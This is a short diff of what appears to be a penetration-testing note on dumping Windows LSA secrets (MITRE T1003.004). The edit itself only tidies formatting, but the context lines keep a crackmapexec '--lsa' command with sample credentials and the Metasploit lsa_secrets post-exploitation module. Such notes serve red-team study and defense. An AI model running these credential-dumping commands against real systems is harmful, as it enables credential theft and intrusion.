@@ -1,14 +1,6 @@
----
-date: 
-tags:
-  - ActiveDirectory
-  - LSA
----
 
-```table-of-contents
-```
 
-# Description: 
+# Description:
 
 https://attack.mitre.org/techniques/T1003/004/
 
@@ -34,7 +26,7 @@ crackmapexec smb '10.10.10.100' -u 'moe' -p 'Password123' --lsa
 
 ### Metasploit
 
-```
+```bash
 use post/windows/gather/lsa_secrets
 ```
 
